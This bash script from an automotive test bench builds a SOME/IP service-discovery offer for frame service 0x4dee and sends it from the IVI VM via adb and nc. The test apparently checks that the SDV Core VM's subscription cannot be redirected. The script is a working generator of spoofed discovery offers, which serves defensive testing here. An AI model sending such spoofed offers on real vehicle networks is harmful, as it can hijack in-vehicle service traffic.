#!/usr/bin/env bash
# Send one SOME/IP service-discovery offer of the frame service from the IVI VM
# on the shared bridge segment (VC-MW-016: the SD offer that must not redirect
# the SDV Core VM's subscription). It builds the SD bytes and sends them with
# the guest's own nc; the evaluator reads the effect from host-cvd-ebr.pcap.
# Standard tools only; it never dispatches a workflow and never runs on CI.
#
#   send_sd_offer.sh send <provider-addr> <reliable-port>   send the offer from the IVI VM
#   send_sd_offer.sh bytes <provider-addr> <reliable-port>  print the raw SD datagram (for a test)
#
# The offer names service 0x4dee instance 0x0001 major 1 with a positive TTL
# and an IPv4 endpoint of <provider-addr>:<reliable-port>/tcp, so a stack that
# honours it would subscribe to that provider instead of the host.
set -uo pipefail
HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
. "$HERE/bench_env.sh"

FRAME_SERVICE_HEX=4dee        # service 0x4dee, instance 0x0001 (the overlay's frame service)
FRAME_INSTANCE_HEX=0001

# The SD datagram as a lowercase hex string. All multi-byte fields are
# big-endian. The layout matches the SOME/IP-SD reader (src/.../sd.py) and the
# test builder: a SOME/IP header, the SD payload (flags, one offer entry, one
# IPv4 endpoint option).
_offer_hex() {
  local addr="$1" port="$2" a b c d ip_hex port_hex
  IFS=. read -r a b c d <<EOF
$addr
EOF
  ip_hex="$(printf '%02x%02x%02x%02x' "$a" "$b" "$c" "$d")"
  port_hex="$(printf '%04x' "$port")"
  # IPv4 endpoint option: length 0x0009, type 0x04, reserved, address,
  # reserved, protocol 0x06 (tcp), port.
  local option="00090400${ip_hex}0006${port_hex}"
  # Offer entry (type 0x01): first-option index 0, one option in the first run
  # (0x10), service, instance, major 1, TTL 0x000003, minor 0x00000000.
  local entry="01000010${FRAME_SERVICE_HEX}${FRAME_INSTANCE_HEX}0100000300000000"
  local entries_len options_len
  entries_len="$(printf '%08x' $(( ${#entry} / 2 )))"
  options_len="$(printf '%08x' $(( ${#option} / 2 )))"
  # SD payload: flags 0xc0 (reboot+unicast), 3 reserved bytes, entries, options.
  local payload="c0000000${entries_len}${entry}${options_len}${option}"
  local length
  length="$(printf '%08x' $(( 8 + ${#payload} / 2 )))"
  # SOME/IP header: service 0xffff, method 0x8100, length, client 0, session 1,
  # protocol 1, interface 1, message type 0x02 (notification), return code 0.
  printf 'ffff8100%s0000000101010200%s' "$length" "$payload"
}

case "${1:-}" in
  bytes)
    _offer_hex "${2:?usage: $0 bytes <provider-addr> <reliable-port>}" "${3:?reliable port}" | xxd -r -p
    ;;
  send)
    addr="${2:?usage: $0 send <provider-addr> <reliable-port>}"; port="${3:?reliable port}"
    require_cmd "$ADB" xxd || true
    "$ADB" connect "$IVI_ADB" >/dev/null 2>&1 || true
    local_hex="$(_offer_hex "$addr" "$port")"
    log "sending a spoofed SD offer of service 0x${FRAME_SERVICE_HEX}.${FRAME_INSTANCE_HEX} (provider ${addr}:${port}) from the IVI VM"
    "$ADB" -s "$IVI_ADB" shell "echo -n '$local_hex' | toybox xxd -r -p | toybox nc -u -w 1 ${SD_GROUP} ${SD_PORT}" \
      >/dev/null 2>&1 || log "NOTE: the guest send returned non-zero; check nc and xxd on the IVI image"
    ;;
  *) echo "usage: $0 {send|bytes} <provider-addr> <reliable-port>" >&2; exit 2 ;;
esac
